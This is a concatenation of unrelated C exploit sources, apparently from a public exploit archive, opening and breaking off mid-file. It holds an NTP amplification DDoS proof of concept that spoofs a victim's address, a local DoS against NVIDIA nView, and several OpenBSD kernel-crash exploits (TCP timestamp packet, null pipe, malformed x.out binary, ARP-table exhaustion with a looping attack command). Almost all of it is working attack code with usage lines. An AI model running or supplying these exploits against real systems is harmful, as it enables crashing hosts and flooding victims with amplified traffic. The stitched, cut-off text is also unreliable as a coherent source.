  if ((n = sock_recv (fd, rbuf_pkt, sizeof rbuf_pkt)) != NOVANET_PKT_SZ)
    {
      fprintf (stderr, "main: sock_recv returned %d (!= %d)\n",
               n, NOVANET_PKT_SZ);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  srand (time (NULL));
  rlen = NOVANET_MAX_LEN + (rand () % (UINT_MAX - NOVANET_MAX_LEN)) + 1;
  *(unsigned int *) &rem_pkt[12] = rlen;

  printf ("** sending smash packet [remaining length %u-bytes]...", rlen);
  if ((n = sock_send (fd, rem_pkt, sizeof rem_pkt - 1)) != NOVANET_HDR_SZ)
    {
      fprintf (stderr, "main: sock_send returned %d (!= %d)\n",
               n, NOVANET_HDR_SZ);
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  usleep (USLEEP_TIME);
  close (fd);

  return (EXIT_SUCCESS);
}
/*
 * Exploit Title: CVE-2013-5211 PoC - NTP DDoS amplification
 * Date: 28/04/2014
 * Code Author: Danilo PC - <DaNotKnow@gmail.com>
 * CVE : CVE-2013-5211
*/

/* I coded this program to help other to understand how an DDoS attack amplified by NTP servers works (CVE-2013-5211)
 * I took of the code that generates a DDoS, so this code only sends 1 packet. Why? Well...there's a lot of kiddies out there, 
 *  if you know how to program, making a loop or using with other tool is piece of cake. There core idea is there, just use it as you please.
 */

//------------------------------------------------------------------------------------------------//
//------------------------------------------------------------------------------------------------//


#include <stdio.h>         //For on printf function
#include <string.h>        //For memset
#include <sys/socket.h>    //Structs and Functions used for sockets operations.
#include <stdlib.h>	   //For exit function
#include <netinet/ip.h>    //Structs for IP header

//Struct for UDP Packet
struct udpheader{
	unsigned short int udp_sourcePortNumber;
	unsigned short int udp_destinationPortNumber;
	unsigned short int udp_length;
	unsigned short int udp_checksum;
};

// Struct for NTP Request packet. Same as req_pkt from ntpdc.h, just a little simpler
struct 	ntpreqheader {
	unsigned char rm_vn_mode;		/* response, more, version, mode */
	unsigned char auth_seq;		/* key, sequence number */
	unsigned char implementation;		/* implementation number */
	unsigned char request;			/* request number */
	unsigned short err_nitems;		/* error code/number of data items */
	unsigned short  mbz_itemsize;		/* item size */
	char data[40];				/* data area [32 prev](176 byte max) */
	unsigned long tstamp;			/* time stamp, for authentication */
	unsigned int keyid;			/* encryption key */
	char mac[8]; 		/* (optional) 8 byte auth code */
};


// Calculates the checksum of the ip header.
unsigned short csum(unsigned short *ptr,int nbytes) 
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
    return(answer);
}


//Da MAIN

int main(int argc, char **argv)
{
int status;			// Maintains the return values of the functions
struct iphdr *ip;		// Pointer to ip header struct
struct udpheader *udp;		// Pointer to udp header struct
struct ntpreqheader *ntp;	// Pointer to ntp request header struct
int sockfd;			// Maintains the socket file descriptor
int one = 1;			// Sets the option IP_HDRINCL of the sockt to tell the kernel that the header are alredy included on the packets.
struct sockaddr_in dest;	// Maintains the data of the destination address
char packet[ sizeof(struct iphdr) + sizeof(struct udpheader) + sizeof(struct ntpreqheader) ]; //Packet itself

// Parameters check
	if( argc != 3){
		printf("Usage: ./ntpDdos [Target IP] [NTP Server IP]\n");
		printf("Example: ./ntpDdos 1.2.3.4 127.0.0.1 \n");
		printf("Watch it on wireshark!\n");
		printf("Coded for education purpose only!\n");
		exit(1);
	}

// Create a socket and tells the kernel that we want to use udp as layer 4 protocol
	sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
	if (sockfd == -1){
		printf("Error on initializing the socket\n");
		exit(1);
	}



//Sets the option IP_HDRINCL
	status = setsockopt( sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof one);
	if (status == -1){
                printf("Error on setting the option HDRINCL on socket\n");
                exit(1);
        }


//"Zeroes" all the packet stack
	memset( packet, 0, sizeof(packet) );


//Mounts the packet headers
// [ [IP HEADER] [UDP HEADER] [NTP HEADER] ] --> Victory!!!
	ip = (struct iphdr *)packet;
	udp = (struct udpheader *) (packet + sizeof(struct iphdr) );
	ntp = (struct ntpreqheader *) (packet + sizeof(struct iphdr) + sizeof(struct udpheader) );


//Fill the IP Header
	ip->version = 4;		//IPv4
        ip->ihl = 5;			//Size of the Ip header, minimum 5
        ip->tos = 0;			//Type of service, the default value is 0
        ip->tot_len = sizeof(packet);   //Size of the datagram
        ip->id = htons(1234);   	//LengthIdentification Number
        ip->frag_off = 0;		//Flags, zero represents reserved
        ip->ttl = 255;	      		//Time to Live. Maximum of 255
        ip->protocol = IPPROTO_UDP;	//Sets the UDP as the next layer protocol
        ip->check = 0;	      		//Checksum.
        ip->saddr = inet_addr( argv[1] );  //Source ip ( spoofing goes here)
        ip->daddr = inet_addr( argv[2] ); //Destination IP

	//Fills the UDP Header
	udp->udp_sourcePortNumber = htons( atoi( "123" ) );       //Source Port
	udp->udp_destinationPortNumber = htons(atoi("123")) ;   //Destination Port
	udp->udp_length = htons( sizeof(struct udpheader) + sizeof(struct ntpreqheader) ); //Length of the packet
	udp->udp_checksum = 0;				     //Checksum

	//Calculate the checksums
	ip->check = csum((unsigned short *)packet, ip->tot_len);   //Calculate the checksum for iP header

	//Sets the destination data
	dest.sin_family = AF_INET;				 // Address Family Ipv4
	dest.sin_port = htons (atoi( "123" ) ) ; 		// Destination port
	dest.sin_addr.s_addr = inet_addr( argv[2] );       // Destination Endereço para onde se quer enviar o pacote 

	//Fills the NTP header
	//Ok, here is the magic, we need to send a request ntp packet with the modes and codes sets for only MON_GETLIST
	//To do this we can import the ntp_types.h and use its structures and macros. To simplify i've created a simple version of the 
	// ntp request packet and hardcoded the values for the fields to make a "MON_GETLIST" request packet. 
	// To learn more, read this: http://searchcode.com/codesearch/view/451164#127
	ntp->rm_vn_mode=0x17;       //Sets the response bit to 0, More bit to 0, Version field to 2, Mode field to 7
	ntp->implementation=0x03;   //Sets the implementation to 3
	ntp->request=0x2a;	    //Sets the request field to 42 ( MON_GETLIST )
				    //All the other fields of the struct are zeroed
	

	// Sends the packets
	status = sendto(sockfd, packet, ip->tot_len, 0, (struct sockaddr *)&dest, sizeof(dest) );
		if(status <0){
			printf("Failed to send the packets\n");
			exit(1);
		}


}source: http://www.securityfocus.com/bid/21260/info

NVIDIA nView is prone to a local denial-of-service vulnerability.

An attacker can exploit this issue to crash the affected computer, denying service to legitimate users.

/*
NVIDIA nView (keystone) local Denial Of service
(c)oded By Hessam-x / www.Hessamx.net
*/

#include <stdio.h>
#include <string.h>
#include <windows.h>
int main()
{


char junk[] = "a";
char box[650];

 char *buf;

 int i;
        printf("-:: NVIDIA nView (keystone) Denial Of service \n");
        printf("-:: Coded By Hessam-x / www.hessamx.net \n");
    strcpy(box,"a");
        for (i = 0; i < 600; i++) {
          strcat(box,junk);
        }
         buf = (char *) malloc(650);


strcpy (buf,"keystone\t");
strcat (buf,box);
buf[650-1]='\0';

WinExec(buf,0);
free(buf);
}#define _BSD_SOURCE

#include <stdio.h> 
#include <ctype.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <netinet/in_systm.h> 
#include <netinet/ip.h> 
#include <netinet/tcp.h> 
#include <sysexits.h> 
#include <stdlib.h> 
#include <unistd.h> 
#include <sys/types.h> 
/* edited by /str0ke ! milw0rm.com to compile under linux */
#ifndef TCPOPTLEN 
 #define TCPOPTLEN 12 
#endif 
#define UMASK 0xffff 
#define TIMESTAMP 0x7b000000 // 123 in hex - change it, this will probably help 
                             // ftp://ftp.openbsd.org/pub/OpenBSD/patches/3.6/common/010_rtt.patch 

/* 
ANY MODIFIED REPUBLISHING IS RESTRICTED 
OpenBSD 2.0 - 3.6 Remote DoS Exploit 
Tested under OpenBSD 3.6 at OpenBSD 3.5/3.6 
Vuln by OpenBSD errata, http://www.openbsd.org/errata.html 
(c)oded by __blf 2005 RusH Security Team, http://rst.void.ru 
Public version - change TimeStamp to cause System Crash 
Gr33tz: zZz, Phoenix, MishaSt, Inck-Vizitor, BlackPrince 
Fuck lamerz: Saint_I, nmalykh, Mr.Clumsy, RooD aka MapycyA 
All rights reserved. 
ANY MODIFIED REPUBLISHING IS RESTRICTED 
*/

u_short checksum(unsigned short * addr, int len) 
{ 
u_int32_t cksum  = 0; 
while(len > 0) 
{ 
cksum += *addr++; 
len -= 2; 
} 
if(len == 0) 
{ 
cksum += *(u_char *)addr; 
} 
cksum = (cksum >> 16) + (cksum & UMASK); 
cksum = cksum + (cksum >> 16); 
return (~cksum); 
} 

int main(int argc, char ** argv) 
{ 
struct in_addr src, dst; 
struct sockaddr_in sin; 
struct ip * iph; 
struct tcphdr * tcph; 
struct _pseudoheader { 
struct in_addr src_addr; 
struct in_addr dest_addr; 
u_char zero; 
u_char protocol; 
u_short length; 
} pseudoheader; 
u_char * packet; 
u_char * pseudopacket; 
int mysock; 
int on = 1; 
u_char * ts; u_int32_t val = TIMESTAMP; 
if( argc != 4) 
{ 
fprintf(stderr, "r57obsd-dos.c by __blf\n"); 
fprintf(stderr, "RusH Security Team\n"); 
fprintf(stderr, "Usage: %s <source ip> <dest ip> <dest port>\n", argv[0]); 
return EX_USAGE; 
} 
if ((packet = (char *)malloc(sizeof(struct ip) + sizeof(struct tcphdr) + TCPOPTLEN)) == NULL) 
{ 
perror("malloc"); 
return EX_OSERR; 
} 
inet_aton(argv[1], &src); 
inet_aton(argv[2], &dst); 
iph = (struct ip *) packet; 
iph->ip_v = IPVERSION; 
iph->ip_hl = 5; 
iph->ip_tos = 0; 
iph->ip_len = ntohs(sizeof(struct ip) + sizeof(struct tcphdr) + TCPOPTLEN); 
iph->ip_off = htons(IP_DF); 
iph->ip_ttl = 255; 
iph->ip_p = IPPROTO_TCP; 
iph->ip_sum = 0; 
iph->ip_src = src; 
iph->ip_dst = dst; 
tcph = (struct tcphdr *)(packet +sizeof(struct ip)); 
tcph->th_sport = htons(rand()); // just random 
tcph->th_dport = htons(atoi(argv[3])); 
tcph->th_seq = htonl(rand()); 
tcph->th_ack = htonl(rand()); 
tcph->th_off = 5 + (TCPOPTLEN >> 2); 
tcph->th_flags = TH_ACK; 
tcph->th_win = htons(512); 
tcph->th_urp = 0; 
ts = (unsigned char *)(packet + sizeof(struct ip) + sizeof(struct tcphdr)); 
ts[0] = ts[1] = 1; 
ts[2] = 8; 
ts[3] = 10; 
memcpy(ts+4, &val, 4); 
memset(ts+8, 0, 4); 
pseudoheader.src_addr = src; 
pseudoheader.dest_addr = dst; 
pseudoheader.zero = 0; 
pseudoheader.protocol = IPPROTO_TCP; 
pseudoheader.length = htons(sizeof(struct tcphdr) + TCPOPTLEN); 
if((pseudopacket = (char *)malloc(sizeof(pseudoheader)+sizeof(struct tcphdr) + TCPOPTLEN)) == NULL) 
{ 
perror("malloc()"); 
return EX_OSERR; 
} 
memcpy(pseudopacket, &pseudoheader, sizeof(pseudoheader)); 
memcpy(pseudopacket + sizeof(pseudoheader), packet + sizeof(struct ip), sizeof(struct tcphdr) + TCPOPTLEN); 
tcph->th_sum = checksum((unsigned short *)pseudopacket, sizeof(pseudoheader) + sizeof(struct tcphdr) + TCPOPTLEN); 
mysock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW); 
if(!mysock) 
{ 
perror("socket!\n"); 
return EX_OSERR; 
} 
if(setsockopt(mysock, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) == -1) 
{ 
perror("setsockopt"); 
shutdown(mysock, 2); 
return EX_OSERR; 
} 
sin.sin_family = PF_INET; 
sin.sin_addr = dst; 
sin.sin_port = htons(atoi(argv[3])); // doesn't really matter 
if(sendto(mysock, packet, sizeof(struct ip) + sizeof(struct tcphdr) + TCPOPTLEN, 0, (struct sockaddr *)&sin, sizeof(sin)) == -1) 
{ 
perror("sendto()\n"); 
shutdown(mysock, 2); 
return EX_NOHOST; 
} 
printf("Packet sent. Remote machine should crash.\n"); 
shutdown(mysock, 2); 
return  EX_OK; 
} 

// milw0rm.com [2005-03-09]
source: http://www.securityfocus.com/bid/3612/info

OpenBSD is a freely available implementation of the BSD Operating System. It is based on the NetBSD implementation.

Under some conditions, an application launched by a regular user on the system can cause a system crash. When an application on an OpenBSD system attempts to pipe a NULL value, a fault in the kernel causes the system to crash immediately.

This make it possible for a malicious local user to deny service to legitimate users of the system. 

/* obsd-crashme.c - by Marco Peereboom <marcodsl@swbell.net> */
/* December 03, 2001 */

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/wait.h>
#include <signal.h>
#include <stdarg.h>
#include <syslog.h>

/* globals */
int fd[8]; /* temp pipe file descriptors */
int fd_real[4]; /* real pipe's */

static int __DEBUG__  = 0;
static int __SYSLOG__  = 0;

void enable_debug(void)
{
         __DEBUG__ = 1;
}

void disable_debug(void)
{
         __DEBUG__ = 0;
}

void enable_syslog(void)
{
         __SYSLOG__ = 1;
}

void disable_syslog(void)
{
         __SYSLOG__ = 0;
}

void s_fprintf(FILE *file, const char *fmt, ...)
{
         va_list ap;

         if (__DEBUG__) {
                 fflush(file);

                 va_start(ap, fmt);
                 vfprintf(file, fmt, ap);
                 va_end(ap);

                 fflush(file);
         }

         if (__SYSLOG__) {
                 va_start(ap, fmt);
                 vsyslog(LOG_INFO, fmt, ap);
                 va_end(ap);
         }
}

void *s_malloc(size_t size)
{
         char serr[40]; /* can not allocate more mem so lets use this
ugly beast */
         void *p;

         if (__DEBUG__ || __SYSLOG__) {
                 s_fprintf(stderr, "PID=%-5i PPID=%-5i: malloc(%i)\n",
getpid(), getppid(), size);
         }

         if ((p = malloc(size)) == NULL ) {
                 sprintf(serr,"PID=%i, Could not allocate memory",
getpid());
                 perror(serr);
                 exit(6);
         }

         return p;
}

void s_perror(const char *str)
{
         char *buf;

         if (__DEBUG__ || __SYSLOG__) {
                 s_fprintf(stderr, "PID=%-5i PPID=%-5i: perror(%s)\n",
getpid(), getppid(), str);
         }

         buf = s_malloc(11 + strlen(str)); /* PID=%-5i = 11 chars */
         sprintf(buf, "PID=%-5i %s", getpid(), str);
         perror(buf);

         free(buf);
}

void s_pipe(int *fd)
{
         if (__DEBUG__ || __SYSLOG__) {
                 s_fprintf(stderr, "PID=%-5i PPID=%-5i: pipe(%x)\n",
getpid(), getppid(), (unsigned int)fd);
         }

         if (pipe(fd) == -1)
         {
                 s_perror("Could not create pipe");
                 exit(3);
         }
}

int main(int argc, char **argv)
{
         enable_debug();
         enable_syslog();

         fprintf(stderr, "Before pipe\n");
         s_pipe(NULL); /* test if s_pipe exits */
         fprintf(stderr, "Will never reach this\n");

         return 0;
}
source: http://www.securityfocus.com/bid/8978/info

The OpenBSD team has fixed a vulnerability in the OpenBSD kernel when handling certain executables. It appears that the problem lies in the lack of specific sanity checks on binary header values. As a result, a user who constructs a malformed binary and subsequently executes it may trigger a kernel panic.

*** November 5, 2003 - New information discovered by the researcher suggests that the implications of this vulnerability could in fact be higher then initially anticipated. As such, it is believed that successful exploitation of this issue under some conditions could potentially lead to code execution within the context of the kernel. This has been conjectured due to varying crashes observed when triggering the condition. Due to the lack of details regarding this possiblity, the status of this BID will remain the same until more information is available. 

//
// Patch ftp://ftp.openbsd.org/pub/OpenBSD/patches/3.4/common/005_exec.patch
//
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
/* $OpenBSD: ibcs2_exec.h,v 1.3 2002/03/14 01:26:50 millert Exp $ */
/* $NetBSD: ibcs2_exec.h,v 1.4 1995/03/14 15:12:24 scottb Exp $ */

/*
 * Copyright (c) 1994, 1995 Scott Bartram
 * All rights reserved.
 *
 * adapted from sys/sys/exec_ecoff.h
 * based on Intel iBCS2
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#ifndef _IBCS2_EXEC_H_
#define _IBCS2_EXEC_H_

/*
 * COFF file header
 */

struct coff_filehdr {
    u_short f_magic; /* magic number */
    u_short f_nscns; /* # of sections */
    long f_timdat; /* timestamp */
    long f_symptr; /* file offset of symbol table */
    long f_nsyms; /* # of symbol table entries */
    u_short f_opthdr; /* size of optional header */
    u_short f_flags; /* flags */
};

/* f_magic flags */
#define COFF_MAGIC_I386 0x14c

/* f_flags */
#define COFF_F_RELFLG 0x1
#define COFF_F_EXEC 0x2
#define COFF_F_LNNO 0x4
#define COFF_F_LSYMS 0x8
#define COFF_F_SWABD 0x40
#define COFF_F_AR16WR 0x80
#define COFF_F_AR32WR 0x100

/*
 * COFF system header
 */

struct coff_aouthdr {
    short a_magic;
    short a_vstamp;
    long a_tsize;
    long a_dsize;
    long a_bsize;
    long a_entry;
    long a_tstart;
    long a_dstart;
};

/* magic */
#define COFF_OMAGIC 0407 /* text not write-protected; data seg
is contiguous with text */
#define COFF_NMAGIC 0410 /* text is write-protected; data starts
at next seg following text */
#define COFF_ZMAGIC 0413 /* text and data segs are aligned for
direct paging */
#define COFF_SMAGIC 0443 /* shared lib */

/*
 * COFF section header
 */

struct coff_scnhdr {
    char s_name[8];
    long s_paddr;
    long s_vaddr;
    long s_size;
    long s_scnptr;
    long s_relptr;
    long s_lnnoptr;
    u_short s_nreloc;
    u_short s_nlnno;
    long s_flags;
};

/* s_flags */
#define COFF_STYP_REG 0x00
#define COFF_STYP_DSECT 0x01
#define COFF_STYP_NOLOAD 0x02
#define COFF_STYP_GROUP 0x04
#define COFF_STYP_PAD 0x08
#define COFF_STYP_COPY 0x10
#define COFF_STYP_TEXT 0x20
#define COFF_STYP_DATA 0x40
#define COFF_STYP_BSS 0x80
#define COFF_STYP_INFO 0x200
#define COFF_STYP_OVER 0x400
#define COFF_STYP_SHLIB 0x800

/*
 * COFF shared library header
 */

struct coff_slhdr {
long entry_len; /* in words */
long path_index; /* in words */
char sl_name[1];
};

#define COFF_ROUND(val, by) (((val) + by - 1) & ~(by - 1))

#define COFF_ALIGN(a) ((a) & ~(COFF_LDPGSZ - 1))

#define COFF_HDR_SIZE \
(sizeof(struct coff_filehdr) + sizeof(struct coff_aouthdr))

#define COFF_BLOCK_ALIGN(ap, value) \
        (ap->a_magic == COFF_ZMAGIC ? COFF_ROUND(value, COFF_LDPGSZ) : \
         value)

#define COFF_TXTOFF(fp, ap) \
        (ap->a_magic == COFF_ZMAGIC ? 0 : \
         COFF_ROUND(COFF_HDR_SIZE + fp->f_nscns * \
sizeof(struct coff_scnhdr), COFF_SEGMENT_ALIGNMENT(ap)))

#define COFF_DATOFF(fp, ap) \
        (COFF_BLOCK_ALIGN(ap, COFF_TXTOFF(fp, ap) + ap->a_tsize))

#define COFF_SEGMENT_ALIGN(ap, value) \
        (COFF_ROUND(value, (ap->a_magic == COFF_ZMAGIC ? COFF_LDPGSZ : \
         COFF_SEGMENT_ALIGNMENT(ap))))

#define COFF_LDPGSZ 4096

#define COFF_SEGMENT_ALIGNMENT(ap) 4

#define COFF_BADMAG(ex) (ex->f_magic != COFF_MAGIC_I386)

#define IBCS2_HIGH_SYSCALL(n) (((n) & 0x7f) == 0x28)
#define IBCS2_CVT_HIGH_SYSCALL(n) (((n) >> 8) + 128)

struct exec_package;
int exec_ibcs2_coff_makecmds(struct proc *, struct exec_package *);

/*
 * x.out (XENIX)
 */

struct xexec {
u_short x_magic; /* magic number */
u_short x_ext; /* size of extended header */
long x_text; /* ignored */
long x_data; /* ignored */
long x_bss; /* ignored */
long x_syms; /* ignored */
long x_reloc; /* ignored */
long x_entry; /* executable entry point */
char x_cpu; /* processor type */
char x_relsym; /* ignored */
u_short x_renv; /* flags */
};

/* x_magic flags */
#define XOUT_MAGIC 0x0206

/* x_cpu flags */
#define XC_386 0x004a /* 386, word-swapped */

/* x_renv flags */
#define XE_V5 0xc000
#define XE_SEG 0x0800
#define XE_ABS 0x0400
#define XE_ITER 0x0200
#define XE_VMOD 0x0100
#define XE_FPH 0x0080
#define XE_LTEXT 0x0040
#define XE_LDATA 0x0020
#define XE_OVER 0x0010
#define XE_FS 0x0008
#define XE_PURE 0x0004
#define XE_SEP 0x0002
#define XE_EXEC 0x0001

/*
 * x.out extended header
 */

struct xext {
long xe_trsize; /* ignored */
long xe_drsize; /* ignored */
long xe_tbase; /* ignored */
long xe_dbase; /* ignored */
long xe_stksize; /* stack size if XE_FS set in x_renv */
long xe_segpos; /* offset of segment table */
long xe_segsize; /* segment table size */
long xe_mdtpos; /* ignored */
long xe_mdtsize; /* ignored */
char xe_mdttype; /* ignored */
char xe_pagesize; /* ignored */
char xe_ostype; /* ignored */
char xe_osvers; /* ignored */
u_short xe_eseg; /* ignored */
u_short xe_sres; /* ignored */
};

/*
 * x.out segment table
 */

struct xseg {
u_short xs_type; /* segment type */
u_short xs_attr; /* attribute flags */
u_short xs_seg; /* segment selector number */
char xs_align; /* ignored */
char xs_cres; /* ignored */
long xs_filpos; /* offset of this segment */
long xs_psize; /* physical segment size */
long xs_vsize; /* virtual segment size */
long xs_rbase; /* relocation base address */
u_short xs_noff; /* ignored */
u_short xs_sres; /* ignored */
long xs_lres; /* ignored */
};

/* xs_type flags */
#define XS_TNULL 0 /* unused */
#define XS_TTEXT 1 /* text (read-only) */
#define XS_TDATA 2 /* data (read-write) */
#define XS_TSYMS 3 /* symbol table (noload) */
#define XS_TREL 4 /* relocation segment (noload) */
#define XS_TSESTR 5 /* string table (noload) */
#define XS_TGRPS 6 /* group segment (noload) */

#define XS_TIDATA 64
#define XS_TTSS 65
#define XS_TLFIX 66
#define XS_TDNAME 67
#define XS_TDTEXT 68
#define XS_TDFIX 69
#define XS_TOVTAB 70
#define XS_T71 71
#define XS_TSYSTR 72

/* xs_attr flags */
#define XS_AMEM 0x8000 /* memory image */
#define XS_AITER 0x0001 /* iteration records */
#define XS_AHUGE 0x0002 /* unused */
#define XS_ABSS 0x0004 /* uninitialized data */
#define XS_APURE 0x0008 /* read-only (sharable) segment */
#define XS_AEDOWN 0x0010 /* expand down memory segment */
#define XS_APRIV 0x0020 /* unused */
#define XS_A32BIT 0x0040 /* 32-bit text/data */

/*
 * x.out iteration record
 */

struct xiter {
long xi_size; /* text/data size */
long xi_rep; /* number of replications */
long xi_offset; /* offset within segment to replicated data */
};

#define XOUT_HDR_SIZE (sizeof(struct xexec) + sizeof(struct xext))

int exec_ibcs2_xout_makecmds(struct proc *, struct exec_package *);

#endif /* !_IBCS2_EXEC_H_ */

int main(int ac,char **av)
{
int fd;
struct xexec xp;
struct xext xep;
char exe[10];
char fil[]="./vvc";

fd=open(fil,O_CREAT|O_RDWR,0700);
if (fd==-1) {perror("open");return 1;}
memset(&xp,0,sizeof(xp));
memset(&xep,0,sizeof(xep));
memset(exe,'v',sizeof(exe));
xp.x_magic = XOUT_MAGIC;
xp.x_cpu = XC_386;
xp.x_renv = XE_EXEC;
xp.x_ext = sizeof(xep);
xep.xe_segsize = -1;
write(fd,&xp,sizeof(xp));
write(fd,&xep,sizeof(xep));
write(fd,exe,sizeof(exe));
printf("Now exec %s\n",fil);

}



source: http://www.securityfocus.com/bid/1759/info

OpenBSD is vulnerable to a remotely exploitable denial of service condition. The problem seems to be a lack of limits on the storage of pending arp requests, and a failure to handle the condition of too many. If an attacker somehow causes a victim machine to send out too many arp requests, it can cause a kernel panic and the target system to halt.

If an OpenBSD machine is on a network with a large address space (much more than a class C) an attacker can send it spoofed packets with addresses of hosts within its network. The victim host would then send out arp requests to find the MAC address for each host. If a sufficient number of arp requests are sent out, the kernel will panic with the message:

"out of space in kmem_map"

and freeze. 

/*
 * [local/remote] kernel-panic DoS against openBSD 2.6
 * 20000802, anonymous@segfault.net
 *
 * works on local lan or any host which can be reached through
 * gateways with rp_filter = 0 [default on most linux routers and most other
 * OS'es. take a look at /proc/sys/net/ipv4/conf/default/rp_filter].
 *
 * panic: malloc: out of space in kmem_map,
 * Stopped at: _debugger+0x4:   ieave
 *
 * this is nothing special. The kernel runs out of memory
 * and panics.
 *
 * ./obsd_fun <target ip> <network> <count>
 * target_ip is the ...wtf..you know what it is.
 * network is the beginning of the network of the target_ip.
 * count is the number of hosts we spoof from. 
 *
 * How does it work ?:
 * While coding some scanning tool i saw that linux was unable
 * to handle 1000 arp-request/sec [arp-table overflow].
 * I thought obsd could be able to handle 1k arp-request/sec..but
 * i was wrong. 
 *
 * First DoS was a local one. All I did was sent
 * packets to thousend of hosts on the same network.
 * [it doesnt matter if the hosts exist or not]
 * The Obsd kernel paniced after a few seconds.
 * I leave it as an exercise for the reader to reengineer the local DoS.
 * [addon after a 'bratwurscht'-break: i took the exercise myself.]
 *
 * Remote DoS:
 * We send thousends of spoofed packets to the target machiene.
 * The target machiene tries to answer these packets [with
 * a tcp-syn, tcp-rst ,icmp-port-unreachable or whatever].
 *
 * For that it needs the mac-address of the origin host. 
 * If this host does not exist the Obsd box will never get
 * an answer and w8 for the arp-reply until it timesout.
 * Thats it. We simply overflow the arp-table/memory.
 *
 * I use tcp-packets in this example. It also works with udp or icmp.
 *
 * How to use it?:
 * gcc -Wall -o obsd_fun obsd_fun.c
 * If the host-ip is 10.23.13.37 on a 10.23/16 network:
 * leetbox:~# ./obsd_fun 10.23.13.37 10.23.0.1 65534
 *
 * A count of 20.000 works fine here. But my box only has 64 MB ram.
 * If this doesnt work try bigger values.
 * If this still does not work...try an endless loop:
 * while :; do ./obsd_fun 10.23.13.37 10.23.0.1 65534 ; done
 * [sound crazy..but it works. I was unable to DoS a obsd 2.6 on
 * a /16-network with 128 MB ram and a count of 65334...but after
 * 6-loops the box paniced]
 *
 * Local DoS:
 * Works like the remote one. But we use udp this time:
 * myfirstobsd:~$ ./obsd_fun 10.23.0.1 32000
 * works fine on my 64 MB obsd 2.6 box.
 *
 *
 * Oh..i forgott something:
 * Basicly i dont like DoS-attacks or really lame (d)dos attacks.
 * It SUCKs. Thats really not what hacking is about.
 *
 * Greetings: yum. this is a DoS. to lame for greetings.
 *
 * 
 */

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#ifndef __FAVOR_BSD
#define __FAVOR_BSD
#endif
#ifndef __USE_BSD
#define __USE_BSD
#endif
#ifndef __BSD_SOURCE
#define __BSD_SOURCE
#endif
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#define ETH_SIZE        14
#define IP_SIZE         20
#define TCP_SIZE        20

#define int_ntoa(x)   inet_ntoa(*((struct in_addr *)&(x)))

/*
 *  Checksum stuff
 */
#define CKSUM_CARRY(x) \
    (x = (x >> 16) + (x & 0xffff), (~(x + (x >> 16)) & 0xffff))

/*
 * leet net tuple
 */
struct net_tuple
{
  uint32_t src;
  unsigned short int sport;
  uint32_t dst;
  unsigned short int dport;
};

/*
 * pseudo TCP header for calculating the chksum
 */
struct _fakehead {
    uint32_t saddr;
    uint32_t daddr;
    uint8_t  zero;
    uint8_t protocol;
    uint16_t tot_len;
};

unsigned char packet[128];

/* 
 * calc. checksum WITH carry flag.
 * call cksum = CKSUM_CARRY(in_cksum(blah));
 */
int
in_cksum(unsigned short *addr, int len)
{
   int                  nleft = len;
   int                  sum = 0;
   u_short              *w = addr;
   u_short              answer = 0;
   
   while (nleft > 1)
   {
      sum += *w++;
      nleft -= 2;
   }
   
   if (nleft == 1)      /* padding */
   {
      *(u_char *) (&answer) = *(u_char *) w;
      sum += answer;
   }
   
  return(sum);
}


void
add_tcphdr(unsigned char *pkt, struct net_tuple *nt, uint8_t flags)
{
   struct tcphdr                tcp;
   struct _fakehead             fakehead;
   int sum;

   memset(&tcp, 0, sizeof(tcp));
   memset(&fakehead, 0, sizeof(fakehead));

   tcp.th_dport = nt->dport;
   tcp.th_sport = nt->sport;
   fakehead.saddr = nt->src;
 fakehead.daddr = nt->dst;
   fakehead.zero = 0,
   fakehead.protocol = 6;
   fakehead.tot_len = htons(TCP_SIZE);
   sum = in_cksum((u_short *)&fakehead, sizeof(fakehead));
   tcp.th_off = TCP_SIZE >> 2;
   tcp.th_seq = 31337;                         /* ###fixme */
   tcp.th_flags |= flags;                      /* ADD the flags */
   tcp.th_win = htons(0x3fff);
   sum += in_cksum((u_short *)&tcp, sizeof(tcp));
   tcp.th_sum = CKSUM_CARRY(sum);
   memcpy(pkt, &tcp, sizeof(tcp));
}



/*
